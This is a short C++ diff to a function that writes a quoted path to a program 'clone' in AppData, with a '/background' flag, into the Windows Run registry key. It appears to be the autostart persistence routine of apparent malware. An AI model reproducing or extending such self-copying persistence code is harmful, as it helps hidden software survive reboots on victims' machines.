@@ -5,7 +5,7 @@
 void RG::execute() {
 	
 	HKEY hKey = NULL;
-	string path = this->util.getAppDataPath() + this->util.getClone();
+	string path = +"\""+this->util.getAppDataPath() + this->util.getClone()+"\"" + " /background";
 	long opnStatus = RegOpenKeyEx(HKEY_CURRENT_USER, this->util.getRunKey(), 0, KEY_ALL_ACCESS, &hKey);
 
 	if (ERROR_SUCCESS == opnStatus) {
